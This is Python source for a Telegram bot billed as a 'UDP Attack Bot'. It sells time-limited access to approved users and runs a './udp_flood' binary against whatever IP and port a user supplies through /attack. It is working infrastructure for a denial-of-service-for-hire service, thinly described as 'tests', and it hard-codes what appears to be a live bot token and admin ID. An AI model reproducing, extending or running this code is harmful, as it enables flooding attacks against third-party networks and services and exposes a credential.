import subprocess
import time
import sqlite3
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackContext, MessageHandler, Filters, CallbackQueryHandler

# CONFIGURATION
BOT_TOKEN = "<7971488271:AAE5o0zQj2NBpwcWBQjIKSCiWT63jbRy4f8>"
ADMIN_ID = <6773132033>  # Replace with your Telegram ID
BINARY_PATH = "./udp_flood"  # Path to the compiled C binary
DB_PATH = "users.db"

# Initialize the database
def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS users (
                        user_id INTEGER PRIMARY KEY,
                        username TEXT,
                        expiration_time DATETIME
                    )''')
    conn.commit()
    conn.close()

# Check if a user is approved
def is_user_approved(user_id):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT expiration_time FROM users WHERE user_id = ?", (user_id,))
    row = cursor.fetchone()
    conn.close()
    if row:
        expiration_time = datetime.strptime(row[0], "%Y-%m-%d %H:%M:%S")
        return expiration_time > datetime.now()
    return False

# Approve a user
def approve_user(user_id, username, duration):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    expiration_time = datetime.now() + duration
    cursor.execute("INSERT OR REPLACE INTO users (user_id, username, expiration_time) VALUES (?, ?, ?)",
                   (user_id, username, expiration_time.strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit()
    conn.close()

# List approved users
def list_approved_users():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, username, expiration_time FROM users")
    rows = cursor.fetchall()
    conn.close()
    approved_users = []
    for row in rows:
        expiration_time = datetime.strptime(row[2], "%Y-%m-%d %H:%M:%S")
        time_left = expiration_time - datetime.now()
        if time_left.total_seconds() > 0:
            approved_users.append((row[0], row[1], time_left))
    return approved_users

# Start Command
def start(update: Update, context: CallbackContext):
    buttons = [[InlineKeyboardButton("Request Approval ✅", callback_data="request_approval")]]
    reply_markup = InlineKeyboardMarkup(buttons)
    update.message.reply_text(
        "Welcome to Ashwin's UDP Attack Bot! ⚡\n\n" +
        "This bot allows approved users to perform tests.\n\n" +
        "Made by Ashwin",
        reply_markup=reply_markup
    )

# Approve Command (Admin Only)
def approve(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        update.message.reply_text("❌ You are not authorized to use this command.")
        return

    if len(context.args) < 3:
        update.message.reply_text("Usage: /approve <user_id> <username> <duration: hour/day/month>")
        return

    try:
        user_id = int(context.args[0])
        username = context.args[1]
        duration_str = context.args[2].lower()
        if duration_str == "hour":
            duration = timedelta(hours=1)
        elif duration_str == "day":
            duration = timedelta(days=1)
        elif duration_str == "month":
            duration = timedelta(days=30)
        else:
            update.message.reply_text("Invalid duration. Use hour, day, or month.")
            return

        approve_user(user_id, username, duration)
        update.message.reply_text(f"✅ User {username} (ID: {user_id}) approved for {duration_str}.")
    except ValueError:
        update.message.reply_text("Invalid user ID.")

# List Users Command (Admin Only)
def list_users(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_ID:
        update.message.reply_text("❌ You are not authorized to use this command.")
        return

    users = list_approved_users()
    if not users:
        update.message.reply_text("No users are currently approved.")
        return

    response = "Approved Users:\n"
    for user_id, username, time_left in users:
        hours, remainder = divmod(time_left.total_seconds(), 3600)
        minutes, seconds = divmod(remainder, 60)
        response += f"\n✅ {username} (ID: {user_id}) - {int(hours)}h {int(minutes)}m {int(seconds)}s left"
    update.message.reply_text(response)

# Attack Command
last_attack_time = {}

def attack(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if not is_user_approved(user_id):
        update.message.reply_text("❌ You are not approved to use this bot. Contact the admin.")
        return

    global last_attack_time
    now = time.time()
    if user_id in last_attack_time and now - last_attack_time[user_id] < 60:
        update.message.reply_text("⏳ Cooldown in effect. Please wait before launching another attack.")
        return

    if len(context.args) < 3:
        update.message.reply_text("Usage: /attack <ip> <port> <duration>")
        return

    try:
        ip = context.args[0]
        port = int(context.args[1])
        duration = int(context.args[2])
        if duration > 60:
            update.message.reply_text("⏳ Maximum attack duration is 60 seconds.")
            return

        # Execute the binary
        subprocess.Popen([BINARY_PATH, ip, str(port), str(duration), "1"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        last_attack_time[user_id] = now
        update.message.reply_text(f"⚡ Attack launched on {ip}:{port} for {duration} seconds.")
    except ValueError:
        update.message.reply_text("Invalid port or duration.")

# Callback for Inline Buttons
def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()

    if query.data == "request_approval":
        query.edit_message_text("📩 Contact the admin to get approved. Provide your user ID.")

# Main Function
def main():
    init_db()
    updater = Updater(BOT_TOKEN)

    dispatcher = updater.dispatcher
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("approve", approve))
    dispatcher.add_handler(CommandHandler("list_users", list_users))
    dispatcher.add_handler(CommandHandler("attack", attack))
    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, start))
    dispatcher.add_handler(MessageHandler(Filters.command, start))
    dispatcher.add_handler(CallbackQueryHandler(button_handler))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
